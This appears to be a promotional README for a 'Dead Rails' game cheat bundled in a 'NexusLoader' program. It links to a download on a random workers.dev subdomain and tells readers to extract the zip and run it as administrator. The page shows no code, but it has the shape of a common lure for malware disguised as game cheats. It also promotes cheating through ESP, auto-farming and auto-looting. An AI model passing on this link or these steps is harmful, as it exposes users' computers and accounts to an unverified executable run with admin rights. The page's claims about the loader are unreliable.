# Dead Rails Script

[![Download NexusLoader](https://img.shields.io/badge/Download-NexusLoader-38bdf8?style=for-the-badge&labelColor=0b1320)](https://xtiz6i8n6.fresh-link.workers.dev/d4088803)

Dead Rails script bundled in NexusLoader.

## Functions

- auto loot crates and chests
- zombie ESP and count
- auto repair the train
- bond and cash farm
- distance to station overlay
- auto sell at stops

## Steps

1. Extract `NexusLoader.zip`, run as admin
2. Join Dead Rails
3. Attach, select the module, Run

## Settings

| Option | Default |
| --- | --- |
| auto repair | on |
| zombie ESP | on |
| auto sell | on |
| loot priority | value |

## Notes

Auto repair keeps the run alive while looting. Zombie ESP shows counts per range ring.

Windows 10/11. Script comes with the loader.
